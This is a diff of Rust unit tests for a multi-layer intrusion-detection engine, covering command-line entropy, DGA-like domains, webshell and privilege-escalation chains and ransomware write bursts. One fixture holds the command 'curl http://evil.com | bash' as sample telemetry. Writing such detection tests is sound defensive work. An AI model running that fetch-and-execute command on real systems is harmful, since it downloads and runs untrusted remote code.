@@ -13,12 +13,15 @@ fn event(ts: i64, class: EventClass, process: &str, parent: &str, uid: u32) -> T
         uid,
         process: process.to_string(),
         parent_process: parent.to_string(),
+        session_id: 100,
         file_path: None,
+        file_write: false,
         file_hash: None,
         dst_port: None,
         dst_ip: None,
         dst_domain: None,
         command_line: None,
+        event_size: None,
     }
 }
 
@@ -50,6 +53,102 @@ fn temporal_cap_rule(name: &str) -> TemporalRule {
             },
         ],
     }
+}
+
+#[test]
+// AC-DET-201 AC-DET-202
+fn cmdline_information_consistency_between_layers() {
+    let cmd = "curl http://evil.com | bash";
+    let data = cmd.as_bytes();
+    let metrics = information::cmdline_information(data, 20).expect("metrics expected");
+    let normalized = metrics.normalized();
+
+    let event = TelemetryEvent {
+        ts_unix: 1000,
+        event_class: EventClass::ProcessExec,
+        pid: 100,
+        ppid: 1,
+        uid: 0,
+        process: "bash".to_string(),
+        parent_process: "sshd".to_string(),
+        session_id: 1,
+        file_path: None,
+        file_write: false,
+        file_hash: None,
+        dst_port: None,
+        dst_ip: None,
+        dst_domain: None,
+        command_line: Some(cmd.to_string()),
+        event_size: None,
+    };
+
+    let signals = DetectionSignals {
+        z1_exact_ioc: false,
+        z2_temporal: false,
+        z3_anomaly_high: false,
+        z3_anomaly_med: false,
+        z4_kill_chain: false,
+        l1_prefilter_hit: false,
+    };
+
+    let features = layer5::MlFeatures::extract(&event, &signals, 0, 0, 0, 0);
+    assert!((features.values[14] - normalized.renyi_h2).abs() < 1e-12);
+    assert!((features.values[15] - normalized.compression_ratio).abs() < 1e-12);
+    assert!((features.values[16] - normalized.min_entropy).abs() < 1e-12);
+    assert!((features.values[17] - normalized.entropy_gap).abs() < 1e-12);
+
+    let mut behavior = behavioral::BehavioralEngine::new();
+    let baseline_scores: Vec<f64> = (0..100).map(|i| i as f64 / 100.0).collect();
+    behavior.calibrate(baseline_scores, 0.05);
+    for i in 0..(2 * 64) {
+        let mut e = event.clone();
+        e.ts_unix += i as i64;
+        behavior.observe(&e);
+    }
+    let alarms = behavior.observe(&event);
+    for alarm in alarms {
+        if alarm.dimension == "cmdline_entropy" {
+            assert!(alarm.current_entropy.is_some());
+        }
+    }
+}
+
+#[test]
+fn dns_entropy_feature_is_stable_and_high_for_dga_like_domains() {
+    let signals = DetectionSignals {
+        z1_exact_ioc: false,
+        z2_temporal: false,
+        z3_anomaly_high: false,
+        z3_anomaly_med: false,
+        z4_kill_chain: false,
+        l1_prefilter_hit: false,
+    };
+    let mut event = TelemetryEvent {
+        ts_unix: 1,
+        event_class: EventClass::DnsQuery,
+        pid: 123,
+        ppid: 1,
+        uid: 0,
+        process: "curl".to_string(),
+        parent_process: "cron".to_string(),
+        session_id: 1,
+        file_path: None,
+        file_write: false,
+        file_hash: None,
+        dst_port: Some(53),
+        dst_ip: None,
+        dst_domain: Some("x7f3a2b9d2c7f.dynamic-dns.net".to_string()),
+        command_line: None,
+        event_size: None,
+    };
+    let features = layer5::MlFeatures::extract(&event, &signals, 0, 0, 0, 0);
+    let entropy_high = features.values[18];
+    assert!(entropy_high > 0.5, "expected high entropy for DGA-like domain");
+
+    event.dst_domain = Some("updates.example.org".to_string());
+    let features2 = layer5::MlFeatures::extract(&event, &signals, 0, 0, 0, 0);
+    let entropy_low = features2.values[18];
+    assert!(entropy_low < entropy_high, "expected lower entropy for normal domain");
 }
 
 #[test]
@@ -213,10 +312,12 @@ fn temporal_engine_detects_webshell_pattern() {
 
     let mut e1 = event(1, EventClass::ProcessExec, "bash", "nginx", 33);
     e1.pid = 200;
+    e1.session_id = 200;
     assert!(t.observe(&e1).is_empty());
 
     let mut e2 = event(5, EventClass::NetworkConnect, "bash", "nginx", 33);
     e2.pid = 200;
+    e2.session_id = 200;
     e2.dst_port = Some(8080);
 
     let hits = t.observe(&e2);
@@ -230,10 +331,12 @@ fn temporal_engine_detects_privilege_escalation_pattern() {
 
     let mut e1 = event(10, EventClass::ProcessExec, "bash", "sshd", 1000);
     e1.pid = 220;
+    e1.session_id = 220;
     assert!(t.observe(&e1).is_empty());
 
     let mut e2 = event(20, EventClass::ProcessExec, "su", "bash", 0);
     e2.pid = 220;
+    e2.session_id = 220;
     let hits = t.observe(&e2);
     assert!(hits.iter().any(|h| h == "phi_priv_esc"));
 }
@@ -245,10 +348,12 @@ fn temporal_engine_entity_isolation_prevents_cross_pid_matches() {
 
     let mut e1 = event(50, EventClass::ProcessExec, "bash", "nginx", 33);
     e1.pid = 1001;
+    e1.session_id = 1001;
     assert!(t.observe(&e1).is_empty());
 
     let mut e2 = event(55, EventClass::NetworkConnect, "bash", "nginx", 33);
     e2.pid = 2002;
+    e2.session_id = 2002;
     e2.dst_port = Some(8443);
 
     let hits = t.observe(&e2);
@@ -262,15 +367,18 @@ fn temporal_engine_pid_reuse_process_exec_clears_stale_pending_webshell_state() 
 
     let mut stage1 = event(100, EventClass::ProcessExec, "bash", "nginx", 33);
     stage1.pid = 777;
+    stage1.session_id = 777;
     assert!(t.observe(&stage1).is_empty());
 
     // Reused pid starts a different process image before the second stage arrives.
     let mut reused_exec = event(103, EventClass::ProcessExec, "python", "systemd", 1000);
     reused_exec.pid = 777;
+    reused_exec.session_id = 777;
     assert!(t.observe(&reused_exec).is_empty());
 
     let mut stale_followup = event(106, EventClass::NetworkConnect, "python", "systemd", 1000);
     stale_followup.pid = 777;
+    stale_followup.session_id = 777;
     stale_followup.dst_port = Some(9001);
     let stale_hits = t.observe(&stale_followup);
     assert!(stale_hits.iter().all(|h| h != "phi_webshell"));
@@ -278,10 +386,12 @@ fn temporal_engine_pid_reuse_process_exec_clears_stale_pending_webshell_state() 
     // A fresh matching chain on the same pid must still detect correctly.
     let mut fresh_stage1 = event(110, EventClass::ProcessExec, "bash", "nginx", 33);
     fresh_stage1.pid = 777;
+    fresh_stage1.session_id = 777;
     assert!(t.observe(&fresh_stage1).is_empty());
 
     let mut fresh_stage2 = event(114, EventClass::NetworkConnect, "bash", "nginx", 33);
     fresh_stage2.pid = 777;
+    fresh_stage2.session_id = 777;
     fresh_stage2.dst_port = Some(9001);
     let fresh_hits = t.observe(&fresh_stage2);
     assert!(fresh_hits.iter().any(|h| h == "phi_webshell"));
@@ -294,12 +404,14 @@ fn temporal_engine_pid_reuse_without_exec_observation_does_not_continue_stale_ch
 
     let mut stage1 = event(600, EventClass::ProcessExec, "bash", "nginx", 33);
     stage1.pid = 889;
+    stage1.session_id = 889;
     assert!(t.observe(&stage1).is_empty());
 
     // Simulate missing exec telemetry for a PID reuse: identity drift on non-process stage
     // must not continue stale pending stages.
     let mut stale_followup = event(605, EventClass::NetworkConnect, "python", "systemd", 1000);
     stale_followup.pid = 889;
+    stale_followup.session_id = 889;
     stale_followup.dst_port = Some(9001);
     let stale_hits = t.observe(&stale_followup);
     assert!(stale_hits.iter().all(|h| h != "phi_webshell"));
@@ -307,10 +419,12 @@ fn temporal_engine_pid_reuse_without_exec_observation_does_not_continue_stale_ch
     // A fresh in-order chain on the same PID must still detect correctly.
     let mut fresh_stage1 = event(610, EventClass::ProcessExec, "bash", "nginx", 33);
     fresh_stage1.pid = 889;
+    fresh_stage1.session_id = 889;
     assert!(t.observe(&fresh_stage1).is_empty());
 
     let mut fresh_stage2 = event(614, EventClass::NetworkConnect, "bash", "nginx", 33);
     fresh_stage2.pid = 889;
+    fresh_stage2.session_id = 889;
     fresh_stage2.dst_port = Some(9001);
     let fresh_hits = t.observe(&fresh_stage2);
     assert!(fresh_hits.iter().any(|h| h == "phi_webshell"));
@@ -322,12 +436,14 @@ fn temporal_engine_process_exit_tears_down_state_and_metadata_immediately() {
 
     let mut stage1 = event(900, EventClass::ProcessExec, "bash", "nginx", 33);
     stage1.pid = 9_001;
+    stage1.session_id = 9_001;
     assert!(t.observe(&stage1).is_empty());
     assert!(t.debug_state_count() > 0);
     assert!(t.debug_has_pid_metadata(9_001));
 
     let mut exit = event(901, EventClass::ProcessExit, "bash", "nginx", 33);
     exit.pid = 9_001;
+    exit.session_id = 9_001;
     assert!(t.observe(&exit).is_empty());
 
     assert_eq!(t.debug_state_count(), 0);
@@ -335,16 +451,19 @@ fn temporal_engine_process_exit_tears_down_state_and_metadata_immediately() {
 
     let mut stale_followup = event(903, EventClass::NetworkConnect, "bash", "nginx", 33);
     stale_followup.pid = 9_001;
+    stale_followup.session_id = 9_001;
     stale_followup.dst_port = Some(9001);
     let stale_hits = t.observe(&stale_followup);
     assert!(stale_hits.iter().all(|h| h != "phi_webshell"));
 
     let mut fresh_stage1 = event(905, EventClass::ProcessExec, "bash", "nginx", 33);
     fresh_stage1.pid = 9_001;
+    fresh_stage1.session_id = 9_001;
     assert!(t.observe(&fresh_stage1).is_empty());
 
     let mut fresh_stage2 = event(908, EventClass::NetworkConnect, "bash", "nginx", 33);
     fresh_stage2.pid = 9_001;
+    fresh_stage2.session_id = 9_001;
     fresh_stage2.dst_port = Some(9001);
     let fresh_hits = t.observe(&fresh_stage2);
     assert!(fresh_hits.iter().any(|h| h == "phi_webshell"));
@@ -356,28 +475,34 @@ fn temporal_engine_process_exit_teardown_is_idempotent_and_ignores_stale_out_of_
 
     let mut stage1 = event(1_000, EventClass::ProcessExec, "bash", "nginx", 33);
     stage1.pid = 9_101;
+    stage1.session_id = 9_101;
     assert!(t.observe(&stage1).is_empty());
 
     let mut first_exit = event(1_005, EventClass::ProcessExit, "bash", "nginx", 33);
     first_exit.pid = 9_101;
+    first_exit.session_id = 9_101;
     assert!(t.observe(&first_exit).is_empty());
 
     let mut duplicate_exit = event(1_005, EventClass::ProcessExit, "bash", "nginx", 33);
     duplicate_exit.pid = 9_101;
+    duplicate_exit.session_id = 9_101;
     assert!(t.observe(&duplicate_exit).is_empty());
     assert_eq!(t.debug_state_count(), 0);
     assert!(!t.debug_has_pid_metadata(9_101));
 
     let mut fresh_stage1 = event(1_010, EventClass::ProcessExec, "bash", "nginx", 33);
     fresh_stage1.pid = 9_101;
+    fresh_stage1.session_id = 9_101;
     assert!(t.observe(&fresh_stage1).is_empty());
 
     let mut stale_exit = event(1_002, EventClass::ProcessExit, "bash", "nginx", 33);
     stale_exit.pid = 9_101;
+    stale_exit.session_id = 9_101;
     assert!(t.observe(&stale_exit).is_empty());
 
     let mut fresh_stage2 = event(1_013, EventClass::NetworkConnect, "bash", "nginx", 33);
     fresh_stage2.pid = 9_101;
+    fresh_stage2.session_id = 9_101;
     fresh_stage2.dst_port = Some(9001);
     let hits = t.observe(&fresh_stage2);
     assert!(hits.iter().any(|h| h == "phi_webshell"));
@@ -390,10 +515,12 @@ fn temporal_engine_eviction_counters_track_retention_and_capacity_reasons() {
 
     let mut first = event(2_000, EventClass::ProcessExec, "bash", "nginx", 33);
     first.pid = 9_201;
+    first.session_id = 9_201;
     assert!(t.observe(&first).is_empty());
 
     let mut second = event(2_010, EventClass::ProcessExec, "bash", "nginx", 33);
     second.pid = 9_202;
+    second.session_id = 9_202;
     assert!(t.observe(&second).is_empty());
 
     let counters_after_capacity = t.debug_eviction_counters();
@@ -402,6 +529,7 @@ fn temporal_engine_eviction_counters_track_retention_and_capacity_reasons() {
 
     let mut horizon = event(3_000, EventClass::FileOpen, "python", "systemd", 1000);
     horizon.pid = 9_203;
+    horizon.session_id = 9_203;
     let _ = t.observe(&horizon);
 
     let counters_after_retention = t.debug_eviction_counters();
@@ -415,6 +543,7 @@ fn temporal_engine_prunes_stale_state_and_pid_metadata_after_retention_horizon()
 
     let mut stale_stage1 = event(100, EventClass::ProcessExec, "bash", "nginx", 33);
     stale_stage1.pid = 990;
+    stale_stage1.session_id = 990;
     assert!(t.observe(&stale_stage1).is_empty());
     assert!(t.debug_state_count() > 0);
     assert!(t.debug_has_pid_metadata(990));
@@ -422,6 +551,7 @@ fn temporal_engine_prunes_stale_state_and_pid_metadata_after_retention_horizon()
     // Advance horizon well past temporal retention to force stale state/metadata pruning.
     let mut horizon_advance = event(500, EventClass::FileOpen, "python", "systemd", 1000);
     horizon_advance.pid = 991;
+    horizon_advance.session_id = 991;
     let _ = t.observe(&horizon_advance);
 
     assert_eq!(t.debug_state_count(), 0);
@@ -432,6 +562,7 @@ fn temporal_engine_prunes_stale_state_and_pid_metadata_after_retention_horizon()
     // Stale follow-up must not trigger on the old pending chain.
     let mut stale_followup = event(505, EventClass::NetworkConnect, "bash", "nginx", 33);
     stale_followup.pid = 990;
+    stale_followup.session_id = 990;
     stale_followup.dst_port = Some(9001);
     let stale_hits = t.observe(&stale_followup);
     assert!(stale_hits.iter().all(|h| h != "phi_webshell"));
@@ -439,10 +570,12 @@ fn temporal_engine_prunes_stale_state_and_pid_metadata_after_retention_horizon()
     // Fresh chain on reused pid must still detect.
     let mut fresh_stage1 = event(510, EventClass::ProcessExec, "bash", "nginx", 33);
     fresh_stage1.pid = 990;
+    fresh_stage1.session_id = 990;
     assert!(t.observe(&fresh_stage1).is_empty());
 
     let mut fresh_stage2 = event(513, EventClass::NetworkConnect, "bash", "nginx", 33);
     fresh_stage2.pid = 990;
+    fresh_stage2.session_id = 990;
     fresh_stage2.dst_port = Some(9001);
     let fresh_hits = t.observe(&fresh_stage2);
     assert!(fresh_hits.iter().any(|h| h == "phi_webshell"));
@@ -456,10 +589,12 @@ fn temporal_engine_state_capacity_evicts_oldest_pending_chain_deterministically(
 
     let mut oldest_stage1 = event(700, EventClass::ProcessExec, "bash", "nginx", 33);
     oldest_stage1.pid = 5_001;
+    oldest_stage1.session_id = 5_001;
     assert!(t.observe(&oldest_stage1).is_empty());
 
     let mut newest_stage1 = event(705, EventClass::ProcessExec, "bash", "nginx", 33);
     newest_stage1.pid = 5_002;
+    newest_stage1.session_id = 5_002;
     assert!(t.observe(&newest_stage1).is_empty());
 
     assert_eq!(t.debug_state_count(), 1);
@@ -467,6 +602,7 @@ fn temporal_engine_state_capacity_evicts_oldest_pending_chain_deterministically(
     // Oldest pending stage should have been evicted by capacity pressure.
     let mut evicted_followup = event(709, EventClass::NetworkConnect, "bash", "nginx", 33);
     evicted_followup.pid = 5_001;
+    evicted_followup.session_id = 5_001;
     evicted_followup.dst_port = Some(9001);
     let evicted_hits = t.observe(&evicted_followup);
     assert!(evicted_hits.iter().all(|h| h != "cap_rule"));
@@ -474,6 +610,7 @@ fn temporal_engine_state_capacity_evicts_oldest_pending_chain_deterministically(
     // Newest pending stage remains valid and should detect.
     let mut retained_followup = event(710, EventClass::NetworkConnect, "bash", "nginx", 33);
     retained_followup.pid = 5_002;
+    retained_followup.session_id = 5_002;
     retained_followup.dst_port = Some(9001);
     let retained_hits = t.observe(&retained_followup);
     assert!(retained_hits.iter().any(|h| h == "cap_rule"));
@@ -486,14 +623,17 @@ fn temporal_engine_pid_metadata_capacity_evicts_oldest_then_tie_breaks_by_pid() 
 
     let mut pid1 = event(800, EventClass::ProcessExec, "python", "systemd", 0);
     pid1.pid = 6_001;
+    pid1.session_id = 6_001;
     assert!(oldest.observe(&pid1).is_empty());
 
     let mut pid2 = event(805, EventClass::ProcessExec, "python", "systemd", 0);
     pid2.pid = 6_002;
+    pid2.session_id = 6_002;
     assert!(oldest.observe(&pid2).is_empty());
 
     let mut pid3 = event(810, EventClass::ProcessExec, "python", "systemd", 0);
     pid3.pid = 6_003;
+    pid3.session_id = 6_003;
     assert!(oldest.observe(&pid3).is_empty());
 
     assert!(!oldest.debug_has_pid_metadata(6_001));
@@ -506,10 +646,12 @@ fn temporal_engine_pid_metadata_capacity_evicts_oldest_then_tie_breaks_by_pid() 
 
     let mut tie_low_pid = event(900, EventClass::ProcessExec, "python", "systemd", 0);
     tie_low_pid.pid = 7_001;
+    tie_low_pid.session_id = 7_001;
     assert!(tie.observe(&tie_low_pid).is_empty());
 
     let mut tie_high_pid = event(900, EventClass::ProcessExec, "python", "systemd", 0);
     tie_high_pid.pid = 7_002;
+    tie_high_pid.session_id = 7_002;
     assert!(tie.observe(&tie_high_pid).is_empty());
 
     assert!(!tie.debug_has_pid_metadata(7_001));
@@ -523,15 +665,18 @@ fn temporal_engine_rejects_stage_restart_from_timestamp_skew_beyond_tolerance() 
 
     let mut first = event(500, EventClass::ProcessExec, "bash", "nginx", 33);
     first.pid = 888;
+    first.session_id = 888;
     assert!(t.observe(&first).is_empty());
 
     // Out-of-order process_exec beyond reorder tolerance must be ignored.
     let mut skewed_restart = event(450, EventClass::ProcessExec, "bash", "nginx", 33);
     skewed_restart.pid = 888;
+    skewed_restart.session_id = 888;
     assert!(t.observe(&skewed_restart).is_empty());
 
     let mut skewed_followup = event(455, EventClass::NetworkConnect, "bash", "nginx", 33);
     skewed_followup.pid = 888;
+    skewed_followup.session_id = 888;
     skewed_followup.dst_port = Some(9001);
     let skewed_hits = t.observe(&skewed_followup);
     assert!(skewed_hits.iter().all(|h| h != "phi_webshell"));
@@ -539,10 +684,12 @@ fn temporal_engine_rejects_stage_restart_from_timestamp_skew_beyond_tolerance() 
     // Fresh in-order chain on same pid must still detect correctly.
     let mut fresh_stage1 = event(506, EventClass::ProcessExec, "bash", "nginx", 33);
     fresh_stage1.pid = 888;
+    fresh_stage1.session_id = 888;
     assert!(t.observe(&fresh_stage1).is_empty());
 
     let mut fresh_stage2 = event(509, EventClass::NetworkConnect, "bash", "nginx", 33);
     fresh_stage2.pid = 888;
+    fresh_stage2.session_id = 888;
     fresh_stage2.dst_port = Some(9001);
     let fresh_hits = t.observe(&fresh_stage2);
     assert!(fresh_hits.iter().any(|h| h == "phi_webshell"));
@@ -555,10 +702,12 @@ fn temporal_engine_rejects_reorder_beyond_tolerance() {
 
     let mut e1 = event(200, EventClass::ProcessExec, "bash", "nginx", 33);
     e1.pid = 303;
+    e1.session_id = 303;
     assert!(t.observe(&e1).is_empty());
 
     let mut e2 = event(197, EventClass::NetworkConnect, "bash", "nginx", 33);
     e2.pid = 303;
+    e2.session_id = 303;
     e2.dst_port = Some(9001);
 
     let hits = t.observe(&e2);
@@ -593,16 +742,19 @@ fn layer4_matches_default_template() {
     let mut parent = event(1, EventClass::ProcessExec, "nginx", "systemd", 33);
     parent.pid = 10;
     parent.ppid = 1;
+    parent.session_id = parent.pid;
     let _ = l4.observe(&parent);
 
     let mut child = event(2, EventClass::ProcessExec, "bash", "nginx", 33);
     child.pid = 11;
     child.ppid = 10;
+    child.session_id = child.pid;
     let _ = l4.observe(&child);
 
     let mut net = event(4, EventClass::NetworkConnect, "bash", "nginx", 33);
     net.pid = 11;
     net.ppid = 10;
+    net.session_id = net.pid;
     net.dst_port = Some(9001);
     let hits = l4.observe(&net);
     assert!(hits.iter().any(|h| h == "killchain_webshell_network"));
@@ -616,16 +768,19 @@ fn layer4_hit_is_scoped_to_current_event_lineage_and_does_not_replay_on_unrelate
     let mut parent = event(1, EventClass::ProcessExec, "nginx", "systemd", 33);
     parent.pid = 50;
     parent.ppid = 1;
+    parent.session_id = parent.pid;
     let _ = l4.observe(&parent);
 
     let mut child = event(2, EventClass::ProcessExec, "bash", "nginx", 33);
     child.pid = 51;
     child.ppid = 50;
+    child.session_id = child.pid;
     let _ = l4.observe(&child);
 
     let mut trigger = event(3, EventClass::NetworkConnect, "bash", "nginx", 33);
     trigger.pid = 51;
     trigger.ppid = 50;
+    trigger.session_id = trigger.pid;
     trigger.dst_port = Some(9001);
     let hits = l4.observe(&trigger);
     assert!(hits.iter().any(|h| h == "killchain_webshell_network"));
@@ -633,6 +788,7 @@ fn layer4_hit_is_scoped_to_current_event_lineage_and_does_not_replay_on_unrelate
     let mut unrelated = event(4, EventClass::ProcessExec, "cron", "systemd", 1000);
     unrelated.pid = 99;
     unrelated.ppid = 1;
+    unrelated.session_id = unrelated.pid;
     let unrelated_hits = l4.observe(&unrelated);
     assert!(
         unrelated_hits
@@ -650,16 +806,19 @@ fn layer4_pid_reuse_does_not_inherit_stale_non_web_network_signal() {
     let mut parent = event(1, EventClass::ProcessExec, "nginx", "systemd", 33);
     parent.pid = 60;
     parent.ppid = 1;
+    parent.session_id = parent.pid;
     let _ = l4.observe(&parent);
 
     let mut child = event(2, EventClass::ProcessExec, "bash", "nginx", 33);
     child.pid = 61;
     child.ppid = 60;
+    child.session_id = child.pid;
     let _ = l4.observe(&child);
 
     let mut malicious_net = event(3, EventClass::NetworkConnect, "bash", "nginx", 33);
     malicious_net.pid = 61;
     malicious_net.ppid = 60;
+    malicious_net.session_id = malicious_net.pid;
     malicious_net.dst_port = Some(9001);
     let hits = l4.observe(&malicious_net);
     assert!(hits.iter().any(|h| h == "killchain_webshell_network"));
@@ -668,6 +827,7 @@ fn layer4_pid_reuse_does_not_inherit_stale_non_web_network_signal() {
     let mut reused_pid_exec = event(20, EventClass::ProcessExec, "bash", "nginx", 33);
     reused_pid_exec.pid = 61;
     reused_pid_exec.ppid = 60;
+    reused_pid_exec.session_id = reused_pid_exec.pid;
     let reuse_hits = l4.observe(&reused_pid_exec);
     assert!(
         reuse_hits.iter().all(|h| h != "killchain_webshell_network"),
@@ -677,6 +837,7 @@ fn layer4_pid_reuse_does_not_inherit_stale_non_web_network_signal() {
     let mut benign_net = event(22, EventClass::NetworkConnect, "bash", "nginx", 33);
     benign_net.pid = 61;
     benign_net.ppid = 60;
+    benign_net.session_id = benign_net.pid;
     benign_net.dst_port = Some(443);
     let benign_hits = l4.observe(&benign_net);
     assert!(
@@ -695,12 +856,14 @@ fn layer4_process_exit_tears_down_node_and_ignores_stale_out_of_order_exit() {
     let mut proc = event(10, EventClass::ProcessExec, "bash", "init", 1000);
     proc.pid = 700;
     proc.ppid = 1;
+    proc.session_id = proc.pid;
     let _ = l4.observe(&proc);
     assert!(l4.debug_contains_pid(700));
 
     let mut stale_exit = event(9, EventClass::ProcessExit, "bash", "init", 1000);
     stale_exit.pid = 700;
     stale_exit.ppid = 1;
+    stale_exit.session_id = stale_exit.pid;
     let _ = l4.observe(&stale_exit);
     assert!(
         l4.debug_contains_pid(700),
@@ -710,6 +873,7 @@ fn layer4_process_exit_tears_down_node_and_ignores_stale_out_of_order_exit() {
     let mut fresh_exit = event(11, EventClass::ProcessExit, "bash", "init", 1000);
     fresh_exit.pid = 700;
     fresh_exit.ppid = 1;
+    fresh_exit.session_id = fresh_exit.pid;
     let _ = l4.observe(&fresh_exit);
     assert!(!l4.debug_contains_pid(700));
 
@@ -727,16 +891,19 @@ fn layer4_node_capacity_evicts_oldest_then_lowest_pid_deterministically() {
     let mut first = event(1, EventClass::ProcessExec, "bash", "init", 1000);
     first.pid = 410;
     first.ppid = 1;
+    first.session_id = first.pid;
     let _ = l4.observe(&first);
 
     let mut second = event(1, EventClass::ProcessExec, "bash", "init", 1000);
     second.pid = 405;
     second.ppid = 1;
+    second.session_id = second.pid;
     let _ = l4.observe(&second);
 
     let mut third = event(2, EventClass::ProcessExec, "bash", "init", 1000);
     third.pid = 420;
     third.ppid = 1;
+    third.session_id = third.pid;
     let _ = l4.observe(&third);
 
     assert_eq!(l4.debug_graph_node_count(), 2);
@@ -761,17 +928,20 @@ fn layer4_edge_capacity_evicts_oldest_nodes_until_edge_budget_is_met() {
     let mut root = event(1, EventClass::ProcessExec, "root", "init", 1000);
     root.pid = 500;
     root.ppid = 1;
+    root.session_id = root.pid;
     let _ = l4.observe(&root);
 
     let mut child_a = event(2, EventClass::ProcessExec, "child-a", "root", 1000);
     child_a.pid = 501;
     child_a.ppid = 500;
+    child_a.session_id = child_a.pid;
     let _ = l4.observe(&child_a);
     assert_eq!(l4.debug_graph_edge_count(), 2);
 
     let mut child_b = event(3, EventClass::ProcessExec, "child-b", "root", 1000);
     child_b.pid = 502;
     child_b.ppid = 500;
+    child_b.session_id = child_b.pid;
     let _ = l4.observe(&child_b);
 
     assert!(
@@ -800,6 +970,7 @@ fn layer4_template_matching_is_bounded_by_declared_depth() {
                 require_network_non_web: false,
                 require_module_loaded: false,
                 require_sensitive_file_access: false,
+                require_ransomware_write_burst: false,
             },
             TemplatePredicate {
                 process_any_of: Some(crate::util::set_of(["mid"])),
@@ -808,6 +979,7 @@ fn layer4_template_matching_is_bounded_by_declared_depth() {
                 require_network_non_web: false,
                 require_module_loaded: false,
                 require_sensitive_file_access: false,
+                require_ransomware_write_burst: false,
             },
             TemplatePredicate {
                 process_any_of: Some(crate::util::set_of(["leaf"])),
@@ -816,6 +988,7 @@ fn layer4_template_matching_is_bounded_by_declared_depth() {
                 require_network_non_web: true,
                 require_module_loaded: false,
                 require_sensitive_file_access: false,
+                require_ransomware_write_burst: false,
             },
         ],
         max_depth: 1,
@@ -825,16 +998,19 @@ fn layer4_template_matching_is_bounded_by_declared_depth() {
     let mut root = event(1, EventClass::ProcessExec, "root", "systemd", 1000);
     root.pid = 10;
     root.ppid = 1;
+    root.session_id = root.pid;
     let _ = l4.observe(&root);
 
     let mut mid = event(2, EventClass::ProcessExec, "mid", "root", 1000);
     mid.pid = 11;
     mid.ppid = 10;
+    mid.session_id = mid.pid;
     let _ = l4.observe(&mid);
 
     let mut leaf = event(3, EventClass::NetworkConnect, "leaf", "mid", 1000);
     leaf.pid = 12;
     leaf.ppid = 11;
+    leaf.session_id = leaf.pid;
     leaf.dst_port = Some(9001);
     let hits = l4.observe(&leaf);
     assert!(hits.iter().all(|h| h != "bounded_depth_chain"));
@@ -851,12 +1027,14 @@ fn layer4_graph_state_is_pruned_by_sliding_window_to_stay_bounded() {
         let mut ev = event(0, EventClass::ProcessExec, "bash", "init", 1000);
         ev.pid = 10_000 + i;
         ev.ppid = 1;
+        ev.session_id = ev.pid;
         let _ = l4.observe(&ev);
     }
 
     let mut now = event(1_000, EventClass::ProcessExec, "bash", "init", 1000);
     now.pid = 99_999;
     now.ppid = 1;
+    now.session_id = now.pid;
     let _ = l4.observe(&now);
 
     assert!(l4.debug_graph_node_count() <= 2);
@@ -885,6 +1063,7 @@ fn layer4_evaluation_runtime_is_bounded_with_depth_limited_templates() {
                     require_network_non_web: false,
                     require_module_loaded: false,
                     require_sensitive_file_access: false,
+                    require_ransomware_write_burst: false,
                 },
                 TemplatePredicate {
                     process_any_of: Some(std::iter::once("never-match".to_string()).collect()),
@@ -893,6 +1072,7 @@ fn layer4_evaluation_runtime_is_bounded_with_depth_limited_templates() {
                     require_network_non_web: true,
                     require_module_loaded: false,
                     require_sensitive_file_access: false,
+                    require_ransomware_write_burst: false,
                 },
             ],
             max_depth: 6,
@@ -904,12 +1084,14 @@ fn layer4_evaluation_runtime_is_bounded_with_depth_limited_templates() {
         let mut ev = event(depth as i64, EventClass::ProcessExec, "bash", "bash", 1000);
         ev.pid = 20_000 + depth;
         ev.ppid = if depth == 0 { 1 } else { 19_999 + depth };
+        ev.session_id = ev.pid;
         let _ = l4.observe(&ev);
     }
 
     let mut trigger = event(201, EventClass::NetworkConnect, "bash", "bash", 1000);
     trigger.pid = 20_199;
     trigger.ppid = 20_198;
+    trigger.session_id = trigger.pid;
     trigger.dst_port = Some(9_001);
 
     let started = std::time::Instant::now();
@@ -926,8 +1108,161 @@ fn engine_runs_all_layers() {
 
     let mut ev = event(1, EventClass::ProcessExec, "bash", "sshd", 1000);
     ev.file_hash = Some("deadbeef".to_string());
+    ev.session_id = ev.pid;
     let out = d.process_event(&ev);
     assert_eq!(out.confidence, Confidence::Definite);
+}
+
+#[test]
+// AC-DET-190 AC-DET-191 AC-DET-192 AC-DET-193
+fn ransomware_write_burst_triggers_killchain_and_ignores_sparse_writes() {
+    let mut l4 = Layer4Engine::with_default_templates();
+
+    for i in 0..10 {
+        let mut ev = event(i, EventClass::FileOpen, "python", "systemd", 1000);
+        ev.pid = 5050;
+        ev.ppid = 1;
+        ev.session_id = ev.pid;
+        ev.file_path = Some("/home/user/docs/report.txt".to_string());
+        ev.file_write = true;
+        let hits = l4.observe(&ev);
+        assert!(
+            hits.iter().all(|h| h != "killchain_ransomware_write_burst"),
+            "sparse writes should not trigger ransomware killchain"
+        );
+    }
+
+    let mut triggered = false;
+    for i in 0..30 {
+        let ts = 200 + (i / 2);
+        let mut ev = event(ts, EventClass::FileOpen, "python", "systemd", 1000);
+        ev.pid = 6060;
+        ev.ppid = 1;
+        ev.session_id = ev.pid;
+        ev.file_path = Some("C:\\Users\\alice\\Documents\\budget.xlsx".to_string());
+        ev.file_write = true;
+        let hits = l4.observe(&ev);
+        if hits.iter().any(|h| h == "killchain_ransomware_write_burst") {
+            triggered = true;
+            break;
+        }
+    }
+
+    assert!(
+        triggered,
+        "write burst in user data path should trigger ransomware killchain"
+    );
+
+    let mut restricted_policy = RansomwarePolicy::default();
+    restricted_policy.adaptive_min_samples = 0;
+    restricted_policy.adaptive_floor = restricted_policy.write_threshold;
+    restricted_policy.user_path_prefixes = vec!["/data/".to_string()];
+    let mut l4_restricted = Layer4Engine::with_capacity_and_policy(
+        300,
+        8_192,
+        32_768,
+        restricted_policy,
+    );
+    for i in 0..30 {
+        let ts = 800 + (i / 2);
+        let mut ev = event(ts, EventClass::FileOpen, "python", "systemd", 1000);
+        ev.pid = 8080;
+        ev.ppid = 1;
+        ev.session_id = ev.pid;
+        ev.file_path = Some("/home/user/docs/notes.txt".to_string());
+        ev.file_write = true;
+        let hits = l4_restricted.observe(&ev);
+        assert!(
+            hits.iter().all(|h| h != "killchain_ransomware_write_burst"),
+            "policy override should suppress default user path matches"
+        );
+    }
+
+    let mut temp_ev = event(500, EventClass::FileOpen, "python", "systemd", 1000);
+    temp_ev.pid = 7070;
+    temp_ev.ppid = 1;
+    temp_ev.session_id = temp_ev.pid;
+    temp_ev.file_path = Some("/tmp/evil.enc".to_string());
+    temp_ev.file_write = true;
+    let hits = l4.observe(&temp_ev);
+    assert!(
+        hits.iter().all(|h| h != "killchain_ransomware_write_burst"),
+        "temp/system paths should not count toward ransomware burst"
+    );
+
+    let mut adaptive_policy = RansomwarePolicy::default();
+    adaptive_policy.write_threshold = 100;
